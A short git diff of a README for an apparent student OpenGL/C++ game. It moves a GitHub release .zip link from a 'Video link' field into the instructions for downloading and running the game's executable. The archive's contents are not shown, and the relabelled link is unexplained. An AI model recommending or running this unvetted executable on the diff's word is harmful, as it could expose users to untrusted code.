@@ -69,7 +69,7 @@ this video game, we used the C++ programming language and the OpenGL graphics li
 
 
 ![enlace-roto](https://github.com/user-attachments/assets/cdb92acc-9ef0-4dff-9bef-a043a208f0a1)  **Video link:**    
-        https://github.com/mi-ley/Proyecto-OpenGL/releases/download/5.9-beta.3/Find.The.World.zip
+        
 
 ![usuario](https://github.com/user-attachments/assets/5c538c68-caaf-4f0d-9750-f720dfa2d9f1)  **Authors:** 
 - Traña Castañeda Mileyda Ines  
@@ -83,7 +83,8 @@ this video game, we used the C++ programming language and the OpenGL graphics li
 
 
 **1. Download the executable file.**  
-Download the compressed package that contains the main executable file along with other necessary components for proper functionality.
+Download the compressed package that contains the main executable file along with other necessary components for proper functionality.    
+https://github.com/mi-ley/Proyecto-OpenGL/releases/download/5.9-beta.3/Find.The.World.zip
 
 **2. Extract the executable file from the compressed package.**  
 Once the download is complete, locate the compressed file (in `.zip` format). Inside the extracted contents, identify the executable file that will launch the application.
